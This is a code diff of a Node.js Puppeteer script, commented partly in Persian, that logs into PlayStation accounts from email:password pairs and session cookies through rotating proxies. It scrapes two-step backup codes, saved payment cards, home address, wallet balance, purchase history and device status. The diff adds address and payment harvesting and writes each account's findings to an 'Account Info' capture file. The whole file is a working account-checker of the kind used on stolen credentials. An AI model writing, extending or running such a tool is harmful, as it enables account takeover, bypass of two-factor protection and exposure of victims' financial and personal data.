@@ -1,3 +1,5 @@
+// psn-api.js:
+
 /**
  * PlayStation API Interaction Tool
  *
@@ -9,6 +11,7 @@ const puppeteer = require("puppeteer");
 const fs = require("fs").promises;
 const axios = require("axios");
 const { spawn } = require("child_process");
+const path = require("path");
 
 // Target URLs to monitor
 const TARGET_URLS = [
@@ -18,6 +21,8 @@ const TARGET_URLS = [
   "https://web.np.playstation.com/api/graphql/v1/op?operationName=getUserDevices",
   "https://accounts.api.playstation.com/api/v1/accounts/me/communication",
   /\/twostepbackupcodes$/,
+  "https://accounts.api.playstation.com/api/v1/accounts/me/addresses",
+  "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments"
 ];
 
 // Page configurations
@@ -231,6 +236,8 @@ async function setupRequestAndResponseTracking(
             onProgress(`Found target request: ${url}`);
 
             const operationName = extractOperationName(url);
+            console.log("operationName =======> ", operationName);
+
             processTargetResponse(operationName, responseData, finalResponses);
             onData(finalResponses);
             break;
@@ -260,8 +267,6 @@ function isMatchingTargetUrl(url, targetUrl) {
  * @param {Object} finalResponses - Object to store processed responses
  */
 function processTargetResponse(operationName, responseData, finalResponses) {
-  console.log("operationName === ", operationName);
-
   switch (operationName) {
     case "communication":
       if (responseData.realName) {
@@ -302,11 +307,6 @@ function processTargetResponse(operationName, responseData, finalResponses) {
       break;
 
     case "getUserDevices":
-      console.log(
-        "majid ======",
-        responseData.data?.deviceStorageDetailsRetrieve
-      );
-
       if (responseData.data?.deviceStorageDetailsRetrieve) {
         finalResponses.devices =
           responseData.data.deviceStorageDetailsRetrieve.map((item) => ({
@@ -317,14 +317,18 @@ function processTargetResponse(operationName, responseData, finalResponses) {
       break;
 
     case "twostepbackupcodes":
-      console.log("responseData =-= ", responseData);
-
       if (responseData.backup_codes) {
         finalResponses.backupCodes = responseData.backup_codes.map(
           (item) => item.code
         );
       }
       break;
+
+    case "addresses":
+      if (responseData.length > 0) {
+        const mainAddress = responseData.find((item) => item.isMain);
+        finalResponses.address = { ...mainAddress };
+      }
   }
 }
 
@@ -354,7 +358,7 @@ async function createConfiguredPage(
 ) {
   const page = await browser.newPage();
 
-  // Set proxy if provided
+  // Set proxy authentication if provided
   if (proxyConfig) {
     await page.authenticate({
       username: proxyConfig.username,
@@ -413,7 +417,7 @@ function combineUniqueCookies(...cookieArrays) {
   const cookieMap = new Map();
 
   for (const cookieArray of cookieArrays) {
-    if (!cookieArray) continue; // Skip null/undefined arrays
+    if (!cookieArray) continue;
 
     for (const cookie of cookieArray) {
       const key = `${cookie.name}:${cookie.domain}`;
@@ -437,67 +441,12 @@ async function wait(ms, reason, onProgress) {
 }
 
 /**
- * Parse proxy data from a string
- * @param {string} proxyData - Proxy data in format host:port:username:password
- * @returns {Object|null} Parsed proxy object or null if invalid
- */
-function parseProxy(proxyData) {
-  if (!proxyData) return null;
-
-  const lines = proxyData.split("\n").filter((line) => line.trim() !== "");
-  if (lines.length === 0) return null;
-
-  // Use the first proxy in the file
-  const proxyLine = lines[0].trim();
-
-  // Check for Lightning Proxies format (host:port:username:password)
-  if (proxyLine.split(":").length === 4) {
-    const [host, port, username, password] = proxyLine.split(":");
-    return {
-      host,
-      port,
-      username,
-      password,
-      url: `http://${username}:${password}@${host}:${port}`,
-    };
-  }
-
-  // Check for standard URL format
-  try {
-    const url = new URL(proxyLine);
-    const protocol = url.protocol.replace(":", "");
-    return {
-      host: url.hostname,
-      port: url.port,
-      username: url.username,
-      password: url.password,
-      protocol,
-      url: proxyLine,
-    };
-  } catch (e) {
-    // If it's not a valid URL, try host:port format
-    const parts = proxyLine.split(":");
-    if (parts.length === 2) {
-      return {
-        host: parts[0],
-        port: parts[1],
-        protocol: "http",
-        url: `http://${parts[0]}:${parts[1]}`,
-      };
-    }
-  }
-
-  return null;
-}
-
-/**
  * Run the PlayStation API tool with the provided credentials
  * @param {Object} options - Tool options
- * @param {string} options.email - User email
- * @param {string} options.password - User password
+ * @param {string} options.credentials - Credentials (email:password)
  * @param {string} options.npsso - NPSSO value
  * @param {string} options.proxyFile - Path to proxy file (optional)
- * @param {string} options.proxyData - Raw proxy data (optional)
+ * @param {string} options.proxyData - Raw proxy data from file (optional)
  * @param {Function} options.onProgress - Progress callback
  * @param {Function} options.onData - Data update callback
  * @param {Function} options.onComplete - Completion callback
@@ -505,11 +454,10 @@ function parseProxy(proxyData) {
  */
 async function runPsnApiTool(options) {
   const {
-    email,
-    password,
+    credentials,
     npsso,
-    proxyFile,
-    proxyData,
+    proxyFile, // مسیر فایل پروکسی (در صورت آپلود شدن)
+    proxyData, // محتویات فایل پروکسی
     onProgress = () => {},
     onData = () => {},
     onComplete = () => {},
@@ -519,24 +467,27 @@ async function runPsnApiTool(options) {
   // Create a new object to store responses
   let finalResponses = {};
 
-  // Parse proxy if provided
+  // درصورتی که پروکسی‌ها موجود باشند، یکی از آن‌ها را تست و انتخاب می‌کنیم
   let proxyConfig = null;
   if (proxyData) {
-    proxyConfig = parseProxy(proxyData);
+    proxyConfig = await findWorkingProxy(proxyData, proxyFile, onProgress);
     if (proxyConfig) {
-      onProgress(`Using proxy: ${proxyConfig.host}:${proxyConfig.port}`);
+      onProgress(
+        `پروکسی سالم انتخاب شده: ${proxyConfig.host}:${proxyConfig.port} (${proxyConfig.protocol})`
+      );
+    } else {
+      onProgress("هیچ پروکسی سالمی یافت نشد؛ ادامه بدون پروکسی");
     }
   }
 
   // Browser launch options
   const browserOptions = {
-    executablePath: "/home/majid/Documents/chrome-linux/chrome",
-    headless: false, // Run headless in production
+    headless: true, // در تولید می‌توانید headless را true کنید
     defaultViewport: null,
     args: ["--no-sandbox", "--disable-setuid-sandbox"],
   };
 
-  // Add proxy args if configured
+  // اضافه کردن پروکسی به args در صورت تنظیم شدن
   if (proxyConfig) {
     browserOptions.args.push(
       `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`
@@ -545,8 +496,7 @@ async function runPsnApiTool(options) {
 
   let browser;
   try {
-    // Launch browser
-    onProgress("Launching browser...");
+    onProgress("راه‌اندازی مرورگر...");
     browser = await puppeteer.launch(browserOptions);
 
     // Setup first page
@@ -566,88 +516,80 @@ async function runPsnApiTool(options) {
     await navigateToPage(
       page1,
       PAGE_CONFIGS.FIRST.url,
-      "the first page",
+      "صفحه اول",
       onProgress
     );
 
     // Wait for first page to fully load and cookies to be set
     await wait(
       PAGE_CONFIGS.FIRST.waitTime,
-      "for first page to fully load",
+      "تا بارگذاری صفحه اول کامل شود",
       onProgress
     );
 
     // Get cookies from first page
     const cookies = await page1.cookies();
-    onProgress(`Retrieved ${cookies.length} cookies from the first page`);
+    onProgress(`دریافت ${cookies.length} کوکی از صفحه اول`);
 
     // Ensure NPSSO cookie is present
     const hasNpsso = cookies.some((cookie) => cookie.name === "npsso");
     if (!hasNpsso) {
-      onProgress(
-        "npsso cookie not found in the retrieved cookies. Adding it manually."
-      );
+      onProgress("کوکی npsso یافت نشد؛ اضافه کردن دستی");
       cookies.push(createNpssoCookie(npsso));
     }
 
-    // try {
-    //   onProgress('Attempting to click on the specified element...');
-    //   await page1.waitForXPath('/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div', { timeout: 10000 });
-    //   const [element] = await page1.$x('/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div');
+    try {
+      onProgress("در حال تلاش برای کلیک روی عنصر مشخص...");
+      await page1.waitForXPath(
+        '/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div',
+        { timeout: 10000 }
+      );
+      const [element] = await page1.$x(
+        '/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[1]/ul/li[2]/div'
+      );
 
-    //   if (element) {
-    //     onProgress('Element found. Clicking...');
-    //     await element.click();
-    //     onProgress('Click successful.');
+      if (element) {
+        onProgress("عنصر یافت شد؛ کلیک...");
+        await element.click();
+        onProgress("کلیک موفقیت‌آمیز.");
 
-    //     // Wait after click to allow any actions to complete
-    //     await wait(3000, 'after clicking the element', onProgress);
+        await wait(3000, "پس از کلیک", onProgress);
 
-    //     // کد جدید برای کلیک دوم با XPath اصلاح شده
-    //     // Wait for navigation after first click
-    //     onProgress('Waiting for navigation after first click...');
-    //     try {
-    //       // Wait for potential navigation to complete
-    //       await page1.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {
-    //         onProgress('No navigation occurred or navigation already completed.');
-    //       });
-
-    //       // Wait a bit for the new page to stabilize
-    //       await wait(5000, 'for the new page to stabilize after navigation', onProgress);
-
-    //       // Now try to find and click the element with the specified XPath
-    //       onProgress('Attempting to find and click on element with XPath: //*[@id="ember138"]/div/div/div/div[1]/div');
-
-    //       // Wait for the element to be available in the DOM
-    //       await page1.waitForXPath('//*[@id="ember138"]/div/div/div/div[1]/div', { timeout: 15000 }).catch(e => {
-    //         onProgress(`Element with specified XPath not found in time: ${e.message}`);
-    //       });
-
-    //       // Try to find the element
-    //       const [secondElement] = await page1.$x('/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div');
-
-    //       if (secondElement) {
-    //         onProgress('Found element with specified XPath. Clicking...');
-    //         await secondElement.click();
-    //         onProgress('Successfully clicked on the second element.');
-
-    //         // Wait after second click to allow any actions to complete
-    //         await wait(5000, 'after clicking the second element', onProgress);
-    //       } else {
-    //         onProgress('Element with specified XPath not found. Continuing with the process.');
-    //       }
-    //     } catch (error) {
-    //       onProgress(`Error while handling second click: ${error.message}`);
-    //       // Continue with the process even if this step fails
-    //     }
-    //   } else {
-    //     onProgress('Element not found with the specified XPath.');
-    //   }
-    // } catch (error) {
-    //   onProgress(`Error while trying to click the element: ${error.message}`);
-    // }
-
-    console.log("finalResponses ======> ", finalResponses);
+        onProgress("در انتظار ناوبری پس از کلیک اول...");
+        try {
+          await page1.waitForNavigation({
+            waitUntil: "networkidle2",
+            timeout: 10000,
+          }).catch(() => {
+            onProgress("ناوبری رخ نداد یا قبلاً انجام شده است.");
+          });
+          await wait(5000, "تا پایداری صفحه جدید", onProgress);
+          onProgress(
+            'در حال تلاش برای یافتن و کلیک روی عنصري با XPath مشخص: //*[@id="ember138"]/div/div/div/div[1]/div'
+          );
+          await page1.waitForXPath('//*[@id="ember138"]/div/div/div/div[1]/div', { timeout: 15000 }).catch(e => {
+            onProgress(`عنصر با XPath مشخص در زمان تعیین شده یافت نشد: ${e.message}`);
+          });
+          const [secondElement] = await page1.$x(
+            '/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[3]/div/div/div/div/div/main/div/div/div[2]/div[1]/ul[3]/li[3]/button/div/div/div/div[1]/div'
+          );
+          if (secondElement) {
+            onProgress("عنصر دوم پیدا شد؛ کلیک...");
+            await secondElement.click();
+            onProgress("کلیک عنصر دوم موفقیت‌آمیز.");
+            await wait(5000, "پس از کلیک عنصر دوم", onProgress);
+          } else {
+            onProgress("عنصر دوم پیدا نشد؛ ادامه روند...");
+          }
+        } catch (error) {
+          onProgress(`خطا در کلیک دوم: ${error.message}`);
+        }
+      } else {
+        onProgress("عنصر با XPath مشخص یافت نشد.");
+      }
+    } catch (error) {
+      onProgress(`خطا هنگام تلاش برای کلیک روی عنصر: ${error.message}`);
+    }
 
     // Setup second page
     const page2 = await createConfiguredPage(
@@ -666,181 +608,38 @@ async function runPsnApiTool(options) {
     await navigateToPage(
       page2,
       PAGE_CONFIGS.SECOND.url,
-      "the second page",
+      "صفحه دوم",
       onProgress
     );
 
-    // Wait and reload second page
-    await wait(
-      PAGE_CONFIGS.SECOND.waitTime,
-      "before reloading the second page",
-      onProgress
-    );
+    await wait(PAGE_CONFIGS.SECOND.waitTime, "پیش از بارگذاری مجدد صفحه دوم", onProgress);
 
     await navigateToPage(
       page2,
       PAGE_CONFIGS.SECOND.url,
-      "the second page (reload 1)",
+      "صفحه دوم (Reload 1)",
       onProgress
     );
 
-    await wait(PAGE_CONFIGS.SECOND.waitTime, "after reload", onProgress);
+    await wait(PAGE_CONFIGS.SECOND.waitTime, "پس از Reload", onProgress);
 
     await navigateToPage(
       page2,
       PAGE_CONFIGS.SECOND.url,
-      "the second page (reload 2)",
+      "صفحه دوم (Reload 2)",
       onProgress
     );
 
-    await wait(15000, "for final page processing", onProgress);
+    await wait(15000, "برای پردازش صفحه نهایی", onProgress);
 
-    // Get final cookies from all pages
-    onProgress("Getting final cookies from all pages...");
+    onProgress("دریافت کوکی‌های نهایی از تمامی صفحات...");
     const finalPage1Cookies = await page1.cookies();
     const finalPage2Cookies = await page2.cookies();
 
-    onProgress(
-      `Retrieved cookies: page1=${finalPage1Cookies.length}, page2=${finalPage2Cookies.length}`
-    );
+    onProgress(`تعداد کوکی دریافت شده: صفحه1=${finalPage1Cookies.length}, صفحه2=${finalPage2Cookies.length}`);
 
-    // Combine all cookies
-    const allCookies = combineUniqueCookies(
-      finalPage1Cookies,
-      finalPage2Cookies
-    );
-    console.log("xxxxxxxxx ----", allCookies);
-
-    // Setup first page
-    const page11 = await createConfiguredPage(
-      browser,
-      null,
-      npsso,
-      TARGET_URLS,
-      finalResponses,
-      PAGE_CONFIGS.FIRST.name,
-      onProgress,
-      onData,
-      proxyConfig
-    );
-
-    // Navigate to first page
-    await navigateToPage(
-      page11,
-      PAGE_CONFIGS.FIRST.url,
-      "the first page",
-      onProgress
-    );
-
-    // Wait for first page to fully load and cookies to be set
-    await wait(
-      PAGE_CONFIGS.FIRST.waitTime,
-      "for first page to fully load",
-      onProgress
-    );
-
-    await wait(
-      5000,
-      "for the new page to stabilize after navigation",
-      onProgress
-    );
-
-    // اضافه کردن مراحل جدید قبل از رفتن به صفحه دوم
-    try {
-      // کلیک روی المان اول جدید
-      onProgress("Attempting to click on first new element...");
-      const xxxx = await page11.waitForXPath(
-        "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[2]/ul/li[8]/div/button",
-        { timeout: 10000 }
-      );
-      const [elTransaction] = await xxxx.$x(
-        "/html/body/div[3]/div/div[2]/div/div/div/div[2]/div/div[2]/div/div/ul/li[2]/ul/li[8]/div/button"
-      );
-
-      if (elTransaction) {
-        await elTransaction.click();
-
-        await wait(
-          20000,
-          "for the new page to stabilize after navigation",
-          onProgress
-        );
-
-        const [firstNewElement] = await page11.$x(
-          "/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div[3]/div[3]/main/div/div[4]/div[3]/button"
-        );
-
-        if (firstNewElement) {
-          await wait(20000, "after clicking first new element", onProgress); // 5 ثانیه صبر
-
-          // Wait for the date input element to be available
-          await page1
-            .waitForSelector("#ember8", { timeout: 10000 })
-            .catch((e) => {
-              onProgress(
-                `Date input field with ID ember8 not found in time: ${e.message}`
-              );
-            });
-
-          // Try to find the date input element
-          const dateInput = await page1.$("#ember8");
-
-          if (dateInput) {
-            onProgress("Found date input field. Setting date value...");
-
-            // Get current date to use as default or set a specific date
-            const today = new Date();
-            const month = String(today.getMonth() + 1).padStart(2, "0"); // Months are 0-indexed
-            const day = String(today.getDate()).padStart(2, "0");
-            const year = today.getFullYear();
-
-            // Format as MM/DD/YYYY
-            const dateValue = `${month}/${day}/${year}`;
-
-            // For HTML date inputs, we need to use YYYY-MM-DD format for the value attribute
-            // but we'll also try the MM/DD/YYYY format for display
-            const htmlDateValue = `${year}-${month}-${day}`;
-
-            // Try multiple approaches to set the date
-
-            // Approach 1: Direct property setting
-            await page1.evaluate(
-              (selector, value) => {
-                const element = document.querySelector(selector);
-                if (element) {
-                  element.value = value;
-                  // Trigger change event to ensure the application recognizes the change
-                  const event = new Event("change", { bubbles: true });
-                  element.dispatchEvent(event);
-                }
-              },
-              "#ember8",
-              htmlDateValue
-            );
-          }
-        } else {
-          onProgress("First new element not found.");
-        }
-      }
-
-      // // کلیک روی المان دوم جدید
-      // onProgress('Attempting to click on second new element...');
-      // await page1.waitForXPath('/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div[3]/div[3]/main/div/div[4]/div[3]', { timeout: 10000 });
-      // const [secondNewElement] = await page1.$x('/html/body/div[3]/div/div[2]/div/div/div/div[3]/div/div/div[3]/div[3]/main/div/div[4]/div[3]');
-
-      // if (secondNewElement) {
-      //   onProgress('Second new element found. Clicking...');
-      //   await secondNewElement.click();
-      //   onProgress('Second new element clicked successfully.');
-      //   await wait(7000, 'after clicking second new element', onProgress); // 7 ثانیه صبر
-      // } else {
-      //   onProgress('Second new element not found.');
-      // }
-    } catch (error) {
-      onProgress(`Error during new steps: ${error.message}`);
-    }
-
-    onProgress(`Combined unique cookies: ${allCookies.length}`);
+    const allCookies = combineUniqueCookies(finalPage1Cookies, finalPage2Cookies);
+    onProgress(`تعداد کوکی‌های ترکیبی: ${allCookies.length}`);
 
     const creditCards = await axios.get(
       "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments?tenant=PSN",
@@ -853,9 +652,11 @@ async function runPsnApiTool(options) {
       }
     );
 
+    console.log(" ========> ", creditCards);
+
     finalResponses = {
       ...finalResponses,
-      creditCards: creditCards.data.creditCards,
+      creditCards: generatePaymentMethodsText(creditCards.data),
     };
 
     const wallets = await axios.get(
@@ -871,42 +672,27 @@ async function runPsnApiTool(options) {
 
     finalResponses = { ...finalResponses, wallets: wallets.data };
 
-    onProgress("Opening PlayStation Store Latest page...");
-    const page3 = await createConfiguredPage(
-      browser,
-      allCookies,
-      npsso,
-      TARGET_URLS,
-      finalResponses,
-      "page3",
-      onProgress,
-      onData,
-      proxyConfig
-    );
-
-    await navigateToPage(
-      page3,
-      "https://store.playstation.com/en-us/pages/latest",
-      "PlayStation Store Latest page",
-      onProgress
-    );
-
-    await wait(10000, "for PlayStation Store page to fully load", onProgress);
-
-    const storePageCookies = await page3.cookies();
-    onProgress(
-      `Retrieved ${storePageCookies.length} cookies from the PlayStation Store page`
-    );
-
-    const updatedAllCookies = combineUniqueCookies(
-      allCookies,
-      storePageCookies
-    );
-    onProgress(`Updated combined unique cookies: ${updatedAllCookies.length}`);
-
-    const backups = await axios.get(
-      "https://ca.account.sony.com/api/v1/user/accounts/6928868522581896841/twostepbackupcodes",
+    const transactions = await axios.get(
+      "https://web.np.playstation.com/api/graphql/v1/transact/transaction/history",
       {
+        params: {
+          limit: 25,
+          startDate: "2010-01-01T00:00:00.000-0400",
+          endDate: "2025-04-06T23:59:59.999-0400",
+          includePurged: false,
+          transactionTypes: [
+            "CREDIT",
+            "CYCLE_SUBSCRIPTION",
+            "DEBIT",
+            "DEPOSIT_CHARGE",
+            "DEPOSIT_VOUCHER",
+            "PRODUCT_PURCHASE",
+            "REFUND_PAYMENT_CHARGE",
+            "REFUND_PAYMENT_WALLET",
+            "VOUCHER_PURCHASE",
+            "WALLET_BALANCE_CONVERSION",
+          ].join(","),
+        },
         headers: {
           Cookie: allCookies
             .map((cookie) => `${cookie.name}=${cookie.value}`)
@@ -915,51 +701,13 @@ async function runPsnApiTool(options) {
       }
     );
 
-    finalResponses = {
-      ...finalResponses,
-      backupCodes: backups.data.backup_codes.map((item) => item.code),
-    };
+    console.log(transactions.data.transactions);
 
-    const transactions = await axios({
-      method: "GET",
-      url: "https://web.np.playstation.com/api/graphql/v1/transact/transaction/history",
-      headers: {
-        Cookie: updatedAllCookies
-          .map((cookie) => `${cookie.name}=${cookie.value}`)
-          .join("; "),
-        "Content-Type": "application/json",
-        Accept: "application/json",
-      },
-      data: {
-        query:
-          "query GetTransactionHistory($input: TransactionHistoryInput!) { transactionHistory(input: $input) { ...fields } }",
-        variables: {
-          input: {
-            limit: 100,
-            startDate: "2010-05-05T00:00:00.000+0430",
-            endDate: "2025-04-05T23:59:59.999+0330",
-            includePurged: false,
-            transactionTypes: [
-              "CREDIT",
-              "CYCLE_SUBSCRIPTION",
-              "DEBIT",
-              "DEPOSIT_CHARGE",
-              "DEPOSIT_VOUCHER",
-              "PRODUCT_PURCHASE",
-              "REFUND_PAYMENT_CHARGE",
-              "REFUND_PAYMENT_WALLET",
-              "VOUCHER_PURCHASE",
-              "WALLET_BALANCE_CONVERSION",
-            ],
-          },
-        },
-      },
-    });
-
-    console.log(transactions);
+    const plusTitle = finalResponses.profile?.isPsPlusMember ? findAndProcessPlayStationPlusItem(transactions.data.transactions) : null
 
     finalResponses = {
       ...finalResponses,
+      transactionNumbers: transactions.data.transactions.length,
       trans: transactions.data.transactions
         .filter(
           (t) =>
@@ -968,23 +716,17 @@ async function runPsnApiTool(options) {
         )
         .map((t) => {
           const fullSkuId = t.additionalInfo.orderItems[0].skuId;
-          const formattedSkuId = fullSkuId.match(
-            /([A-Z0-9]+-[A-Z0-9]+_[0-9]+)/
-          )[0];
-          return `${t.additionalInfo.orderItems[0].productName} [${
-            t.additionalInfo.orderItems[0].totalPrice.formattedValue
-          }] | [ ${formattedSkuId} ] | [ ${
-            new Date(t.transactionDetail.transactionDate).getMonth() + 1
-          }/${new Date(
+          const formattedSkuId = fullSkuId.match(/([A-Z0-9]+-[A-Z0-9]+_[0-9]+)/)[0];
+          return `${t.additionalInfo.orderItems[0].productName} [${t.additionalInfo.orderItems[0].totalPrice.formattedValue}] | [ ${formattedSkuId} ] | [ ${new Date(
             t.transactionDetail.transactionDate
-          ).getDate()}/${new Date(
+          ).getMonth() + 1}/${new Date(
             t.transactionDetail.transactionDate
-          ).getFullYear()} ]`;
+          ).getDate()}/${new Date(t.transactionDetail.transactionDate).getFullYear()} ]`;
         })
         .join("\n"),
     };
 
-    const pythonProcess = spawn("python3", ["get_devices.py", npssoValue]);
+    const pythonProcess = spawn("python3", ["get_devices.py", npsso]);
 
     let result = "";
     let error = "";
@@ -997,40 +739,152 @@ async function runPsnApiTool(options) {
       error += data.toString();
     });
 
-    pythonProcess.on("close", (code) => {
+    pythonProcess.on("close", async (code) => {
       if (code !== 0) {
-        console.error(`خطا در اجرای پایتون:`, error);
+        console.error("خطا در اجرای پایتون:", error);
+        onError(new Error(`خطا در اجرای پایتون: ${error}`));
         return;
       }
 
       try {
-        const devices = JSON.parse(result);
         finalResponses = {
           ...finalResponses,
-          newDevices: devices,
+          newDevices: JSON.parse(result),
         };
-        console.log("Devices:", devices);
+
+        console.log(finalResponses);
+
+        const hasSixMonthsPassed =
+          new Date(
+            finalResponses.newDevices.reduce((latest, current) => 
+              new Date(current.activationDate) > new Date(latest.activationDate) ? current : latest
+            ).activationDate
+          ) < new Date(new Date().setMonth(new Date().getMonth() - 6));
+
+        console.log("hasSixMonthsPassed  ", hasSixMonthsPassed);
+
+         
+
+        // ساخت خروجی نهایی به صورت متن
+        const output = `
+----------------------- « Account Info » -----------------------
+- Account : ${credentials}
+- Npsso : ${npsso}
+- Backup Codes :  [ ${
+          finalResponses.backupCodes
+            ? finalResponses.backupCodes.join(" - ")
+            : "N/A"
+        } ]
+--------------------------- « Details » --------------------------
+- Country | City | Postal Code : ${finalResponses.address.country} - ${finalResponses.address.city} - ${finalResponses.address.postalCode}
+- Balance : ${finalResponses.wallets?.debtBalance}.${finalResponses.wallets?.currentAmount} ${finalResponses.wallets?.currencyCode || ""}
+- PSN ID : ${finalResponses.profile?.onlineId || "N/A"}
+- Payments : ${finalResponses.creditCards || "Not Found"} 
+- PS Plus : ${finalResponses.profile?.isPsPlusMember ? `Yes! - ${plusTitle}` : "No!"}
+- Devices : [ ${
+          finalResponses.newDevices
+            ? [...new Set(finalResponses.newDevices.map((d) => d.deviceType))].join(" - ")
+            : "N/A"
+        } ]
+- Deactive : ${hasSixMonthsPassed === false ? "No!" : "Yes!"}
+- Transaction Numbers : ${finalResponses.transactionNumbers || "N/A"}
+--------------------------- « Games » ---------------------------
+${finalResponses.trans || "No games found"}
+--------------------------- « Finish » ----------------------------
+`;
+
+        // ذخیره خروجی در فایل
+        try {
+          const email = credentials.split(":")[0];
+          const date = new Date().toISOString().split("T")[0];
+          const fileName = `${email}-${date}.txt`;
+          const outputDir = path.join(__dirname, "output");
+          await ensureDirectoryExists(outputDir);
+          const filePath = path.join(outputDir, fileName);
+          await fs.writeFile(filePath, output, "utf8");
+
+          onProgress(`خروجی در فایل ${fileName} ذخیره شد.`);
+          finalResponses.outputFilePath = filePath;
+          finalResponses.formattedOutput = output;
+        } catch (fileError) {
+          onProgress(`خطا در ذخیره فایل خروجی: ${fileError.message}`);
+        }
+
+        onProgress("پردازش با موفقیت به اتمام رسید");
+        onComplete({
+          ...finalResponses,
+          formattedOutput: output,
+        });
       } catch (e) {
         console.error("خطا در تبدیل خروجی:", e);
         console.log("خروجی خام:", result);
+        onError(e);
       }
     });
-
-    console.log("xxxx [] ===> ", finalResponses);
-
-    // Process completed successfully
-    onProgress("Processing completed successfully");
-    onComplete(finalResponses);
   } catch (error) {
-    onProgress(`Error occurred: ${error.message}`);
+    onProgress(`خطا رخ داده: ${error.message}`);
     onError(error);
   } finally {
-    // Close the browser
     if (browser) {
-      // await browser.close();
-      onProgress("Browser closed.");
+      await browser.close();
+      onProgress("مرورگر بسته شد.");
     }
   }
+}
+
+function generatePaymentMethodsText(response) {
+  let paymentMethodsText = [];
+
+  if (response.creditCards) {
+    response.creditCards.forEach((card) => {
+      if (card.common.isPaymentMethodAvailable && !card.common.banned) {
+        let cardInfo = `[${card.common.paymentMethodId} - ${card.expirationYear}/${card.expirationMonth}]`;
+        paymentMethodsText.push(cardInfo);
+      }
+    });
+  }
+
+  if (response.payPal && response.payPal.common.isPaymentMethodAvailable && !response.payPal.common.banned) {
+    paymentMethodsText.push(`[PayPal]`);
+  }
+
+  return paymentMethodsText.join(" - ");
+}
+
+function findAndProcessPlayStationPlusItem(data) {
+  if (!Array.isArray(data)) {
+    return null;
+  }
+  
+  for (const invoice of data) {
+    if (invoice.additionalInfo && Array.isArray(invoice.additionalInfo.orderItems)) {
+      for (const orderItem of invoice.additionalInfo.orderItems) {
+        if (orderItem.productName && orderItem.productName.includes("PlayStation Plus")) {
+          // استخراج عنوان
+          const title = orderItem.productName;
+          
+          // استخراج عدد از عنوان (به عنوان ماه)
+          const monthMatch = title.match(/\d+/);
+          const months = monthMatch ? parseInt(monthMatch[0]) : 0;
+          
+          // استخراج تاریخ تراکنش
+          const transactionDate = new Date(invoice.transactionDetail.transactionDate);
+          
+          // اضافه کردن ماه‌ها به تاریخ
+          const resultDate = new Date(transactionDate);
+          resultDate.setMonth(resultDate.getMonth() + months);
+          
+          // فرمت کردن تاریخ به صورت YYYY-MM-DD
+          const formattedDate = resultDate.toISOString().split('T')[0];
+          
+          // ساخت خروجی نهایی
+          return `${title} | ${formattedDate}`;
+        }
+      }
+    }
+  }
+  
+  return null;
 }
 
 module.exports = { runPsnApiTool };
